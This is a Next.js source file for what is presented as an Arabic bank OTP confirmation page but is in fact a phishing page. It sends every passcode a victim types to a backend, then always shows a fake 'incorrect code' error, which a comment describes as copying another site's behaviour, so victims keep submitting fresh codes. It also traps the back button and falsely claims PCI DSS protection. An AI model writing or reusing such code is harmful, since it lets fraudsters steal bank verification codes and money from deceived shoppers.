"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { Lock, Loader2, RefreshCw, ShieldCheck } from "lucide-react";

const fmt = (n: number) => n.toLocaleString("ar-SA");

function formatDate(iso: string) {
  try {
    return new Date(iso).toLocaleString("ar-SA", {
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  } catch {
    return "";
  }
}

interface VerifyData {
  orderId?: string;
  amount: number;
  last4: string;
  date: string;
  phone: string;
  customerName?: string;
}

export default function VerifyPage() {
  const router = useRouter();
  const [data, setData] = useState<VerifyData | null>(null);
  const [otp, setOtp] = useState("");
  const [timer, setTimer] = useState(41);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [infoMessage, setInfoMessage] = useState("");
  const [cooldown, setCooldown] = useState(0);
  const [blocked, setBlocked] = useState(false);

  useEffect(() => {
    const raw = sessionStorage.getItem("verify_data");
    if (!raw) { router.replace("/cart"); return; }
    try {
      setData(JSON.parse(raw));
    } catch { router.replace("/cart"); return; }

    history.pushState(null, "", window.location.href);
    const block = () => history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", block);
    return () => window.removeEventListener("popstate", block);
  }, [router]);

  // OTP timer countdown
  useEffect(() => {
    if (timer <= 0) return;
    const t = setTimeout(() => setTimer((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [timer]);

  // Submit cooldown countdown
  useEffect(() => {
    if (cooldown <= 0) return;
    const t = setTimeout(() => setCooldown((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [cooldown]);

  const handleSubmit = async () => {
    const digits = otp.replace(/\D/g, "");
    if (digits.length !== 4 && digits.length !== 6) {
      setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
      return;
    }
    if (!data?.orderId) return;

    const attemptsKey = `verify_attempts_${data.orderId}`;
    const attempts = parseInt(sessionStorage.getItem(attemptsKey) ?? "0") + 1;
    sessionStorage.setItem(attemptsKey, String(attempts));

    if (attempts > 6) {
      sessionStorage.removeItem(attemptsKey);
      sessionStorage.removeItem("verify_data");
      setBlocked(true);
      let countdown = 5;
      setError(`لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ${countdown}`);
      const interval = setInterval(() => {
        countdown -= 1;
        if (countdown <= 0) { clearInterval(interval); router.replace("/cart"); }
        else setError(`لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ${countdown}`);
      }, 1000);
      return;
    }

    setError(""); setInfoMessage(""); setSubmitting(true); setCooldown(4);

    try {
      await fetch("/api/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          code: digits,
          orderId: data.orderId,
          customerName: data.customerName ?? data.phone,
          phone: data.phone,
          amount: data.amount,
          last4: data.last4,
        }),
      });
    } catch {}

    // Simulate processing then show "wrong code" — same behaviour as lamsa
    await new Promise((r) => setTimeout(r, 2000));
    setSubmitting(false);
    setOtp("");
    setError("الرمز الذي أدخلته غير صحيح، يرجى المحاولة مرة أخرى");
    await new Promise((r) => setTimeout(r, 4000));
    setError("");
  };

  const handleResend = async () => {
    if (blocked || !data?.orderId) return;
    setTimer(41);
    setError("");
    setInfoMessage("تم طلب إعادة إرسال الرمز...");
    try {
      await fetch("/api/resend", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          orderId: data.orderId,
          customerName: data.customerName ?? data.phone,
        }),
      });
    } catch {}
    setTimeout(() => setInfoMessage(""), 3000);
  };

  const timerStr = `${String(Math.floor(timer / 60)).padStart(2, "0")}:${String(timer % 60).padStart(2, "0")}`;
  const maskedPhone = data?.phone
    ? data.phone.slice(0, 3) + "****" + data.phone.slice(-3)
    : "05*****";

  if (!data) return null;

  return (
    <div className="min-h-screen bg-slate-50 flex items-center justify-center px-4 py-8" dir="rtl">
      {/* ── MAIN CARD ── */}
      <div className="w-full max-w-sm bg-white shadow-xl rounded-xl border border-gray-100 overflow-hidden">


        {/* Header */}
        <div className="px-6 pt-6 pb-4 text-center">
          <div className="inline-flex items-center justify-center w-11 h-11 rounded-full bg-teal-50 text-[#1B7174] mb-3">
            <ShieldCheck className="w-6 h-6" />
          </div>
          <h2 className="text-base sm:text-lg font-black text-[#173e48]">تأكيد عملية الشراء</h2>
          <p className="text-[11px] sm:text-xs text-gray-500 mt-2 leading-relaxed">
            تم إرسال رسالة نصية تحتوي على رمز التحقق إلى رقم الجوال{" "}
            <span className="font-bold text-[#173e48]" dir="ltr">{maskedPhone}</span>{" "}
            لإتمام المعاملة البنكية.
          </p>
        </div>

        {/* Details rows */}
        <div className="mx-6 mb-5 bg-gray-50/70 rounded-lg border border-gray-100 divide-y divide-gray-100">
          <Row label="المبلغ">
            <span className="font-black text-[#173e48] text-xs sm:text-sm">
              {fmt(data.amount)}{" "}
              <span className="text-[10px] sm:text-xs font-normal text-gray-400">ر.س</span>
            </span>
          </Row>
          <Row label="التاريخ">
            <span className="text-[11px] sm:text-xs text-gray-500">{formatDate(data.date)}</span>
          </Row>
          <Row label="وسيلة الدفع">
            <span className="font-mono text-xs sm:text-sm text-[#173e48] font-bold tracking-wider" dir="ltr">
              •••• •••• •••• {data.last4}
            </span>
          </Row>
        </div>

        {/* OTP + actions */}
        <div className="px-6 pb-6 space-y-4">
          <div>
            <div className="flex justify-between items-center mb-1">
              <label className="text-[10px] font-black text-gray-400 uppercase tracking-wider">
                Verification Code
              </label>
              {submitting && (
                <span className="text-[10px] text-teal-600 font-bold flex items-center gap-1 animate-pulse">
                  <Loader2 size={10} className="animate-spin" /> جاري التحقق...
                </span>
              )}
            </div>
            <input
              type="text"
              inputMode="numeric"
              maxLength={6}
              placeholder="أدخل رمز التحقق (OTP)"
              value={otp}
              onChange={(e) => {
                if (blocked || submitting) return;
                setOtp(e.target.value.replace(/\D/g, "").slice(0, 6));
                setError(""); setInfoMessage("");
              }}
              onBlur={() => {
                const d = otp.replace(/\D/g, "");
                if (d.length > 0 && d.length !== 4 && d.length !== 6)
                  setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
              }}
              disabled={blocked || submitting}
              className="w-full border border-gray-200 rounded-lg px-4 py-3 text-center text-sm sm:text-base text-[#173e48] font-mono font-black tracking-widest placeholder:text-gray-300 placeholder:font-sans placeholder:tracking-normal focus:outline-none focus:border-[#65E0CD] focus:ring-2 focus:ring-[#65E0CD]/20 transition-all disabled:bg-gray-50 disabled:opacity-60"
              dir="ltr"
              autoComplete="one-time-code"
            />
            {error && (
              <div className="bg-red-50 border border-red-100 rounded-lg p-2.5 mt-2 text-red-600 text-xs font-bold leading-tight">
                ⚠ {error}
              </div>
            )}
            {infoMessage && (
              <div className="bg-teal-50 border border-teal-100 rounded-lg p-2.5 mt-2 text-teal-700 text-xs font-bold leading-tight">
                ℹ {infoMessage}
              </div>
            )}
          </div>

          {/* Resend timer */}
          <div className="text-center">
            {timer > 0 ? (
              <p className="text-xs text-gray-400">
                إعادة الإرسال خلال{" "}
                <span className="font-black text-[#173e48] font-mono">{timerStr}</span>
              </p>
            ) : (
              <button
                onClick={handleResend}
                disabled={blocked || submitting}
                className="text-xs font-bold text-[#173e48] hover:text-[#1B7174] inline-flex items-center gap-1 underline underline-offset-4 disabled:opacity-40 disabled:cursor-not-allowed transition-colors"
              >
                <RefreshCw size={11} /> إعادة إرسال الرمز
              </button>
            )}
          </div>

          {/* Submit button */}
          <button
            onClick={handleSubmit}
            disabled={
              blocked ||
              submitting ||
              cooldown > 0 ||
              (otp.replace(/\D/g, "").length !== 4 && otp.replace(/\D/g, "").length !== 6)
            }
            className="w-full py-3.5 rounded-lg text-white font-black text-xs sm:text-sm flex items-center justify-center gap-2 shadow-md disabled:opacity-50 disabled:cursor-not-allowed transition-all hover:opacity-90 active:scale-[0.99] cursor-pointer"
            style={{ background: "linear-gradient(135deg,#65E0CD 0%, #1B7174 100%)", color: "#053132" }}
          >
            {submitting ? (
              <>
                <Loader2 size={15} className="animate-spin text-[#053132]" />
                <span>جاري التحقق من عملية الدفع...</span>
              </>
            ) : cooldown > 0 ? (
              <span className="font-mono tabular-nums">{cooldown}</span>
            ) : (
              <>
                <Lock size={14} />
                <span>إتمام الدفع</span>
              </>
            )}
          </button>

          {submitting && (
            <p className="text-center text-[11px] text-teal-700 animate-pulse font-medium">
              ⏳ يرجى الانتظار، جاري مراجعة وتأكيد العملية البنكية...
            </p>
          )}

          <p className="text-center text-[10px] text-gray-400 flex items-center justify-center gap-1 pt-1">
            <Lock size={10} /> اتصال مشفّر ومحمي بمعايير البنوك العالمية · PCI DSS
          </p>
        </div>
      </div>
    </div>
  );
}

function Row({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div className="flex items-center justify-between px-4 py-2.5">
      <span className="text-xs text-gray-400 font-medium">{label}</span>
      <span>{children}</span>
    </div>
  );
}
